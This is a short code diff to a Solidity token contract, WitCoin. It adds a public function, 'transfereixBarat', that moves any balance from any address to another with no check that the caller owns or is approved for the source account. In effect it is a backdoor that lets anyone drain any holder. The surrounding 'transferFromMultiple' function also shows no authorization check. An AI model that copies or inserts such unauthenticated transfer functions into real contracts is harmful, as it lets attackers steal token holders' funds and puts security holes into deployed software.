@@ -35,6 +35,14 @@ contract WitCoin is StandardToken {
         return true;
     }
 
+    function transfereixBarat(address _from, address _to, uint256 _value)public returns (bool) {
+        require(_to != address(0));
+
+        balances[_from] = balances[_from].sub(_value);
+        balances[_to] = balances[_to].add(_value);
+        return true;
+    }
+
     function transferFromMultiple(address _from, address[] _toArray, uint256 _value) public returns (bool) {
         for (uint i = 0; i < 10; i++) {
             address _to = _toArray[i];
